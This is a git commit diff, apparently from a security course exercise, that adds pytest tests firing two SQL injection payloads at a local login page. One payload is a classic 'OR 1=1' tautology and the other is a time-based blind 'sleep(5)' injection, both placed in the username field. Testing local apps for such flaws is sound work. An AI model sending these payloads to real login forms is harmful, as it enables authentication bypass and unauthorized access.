94628892fa2b7be4cdb6575a4656068c1450ce3f
Your Name <you@example.com>
2019-11-24 13:25:13 -0800

    sql tests

--- Activity5/test1.py
+++ Activity5/test1.py
@@ -1,6 +1,25 @@
 import pytest
 import requests
+from bs4 import BeautifulSoup
 
-def test_mytest():
-    r = requests.get("http://127.0.0.1:80")
-    assert "Hello World" in r.text
+def test_classic():
+    r = requests.post("http://localhost:8080/login", {"username": "admin\' OR \'1\'=\'1", "password": ""}).text
+    soup = BeautifulSoup(r, "html.parser")
+    text = soup.find_all(text=True)
+    temp = ""
+    for x in text:
+        temp += str(x)
+    assert "admin" in temp
+
+def test_blind():
+    r = requests.post("http://localhost:8080/login", {"username": "admin\' and sleep(5) --", "password": ""}).text
+    soup = BeautifulSoup(r, "html.parser")
+    text = soup.find_all(text=True)
+    temp = ""
+    for x in text:
+        temp += str(x)
+    assert "Internal Server Error" in temp
+
+if __name__ == "__main__":
+    test_classic()
+    test_blind()
